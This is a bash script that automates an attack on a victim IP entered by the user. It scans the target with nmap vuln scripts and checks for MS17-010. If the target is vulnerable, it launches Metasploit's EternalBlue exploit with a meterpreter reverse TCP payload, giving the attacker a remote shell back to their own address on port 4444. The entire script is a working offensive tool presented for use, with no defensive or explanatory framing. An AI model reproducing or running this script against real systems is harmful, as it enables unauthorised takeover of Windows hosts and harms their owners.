#!/bin/bash

printf '

__  __                  _        __ __
\ \/ /___ _____  ____  (_)____  / //_/
 \  / __ `/ __ \/ __ \/ / ___/ / ,<
 / / /_/ / / / / / / / (__  ) / /| |
/_/\__,_/_/ /_/_/ /_/_/____(_)_/ |_|

'

IP=$(ip addr show eth0 | awk '/inet / {print$2}' | cut -d/ -f1)

read  -p "Please enter the victime's IP : " a
echo ""
echo "Wait a few minutes ..."
nmap -v --script vuln $a > a.txt
STRING="| smb-vuln-ms17-010:"
        if  [[ ! -z $(grep "$STRING" "a.txt") ]];then
        echo "$a are vulnerable to ms17-010"
        sleep 2
	gnome-terminal -- bash -c "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set lhost $IP ; set rhost $a ; set lport 4444 ; exploit ; '; exec bash"
        sleep 1
        rm a.txt
        else
                echo "$a are not vulnerable"
        fi
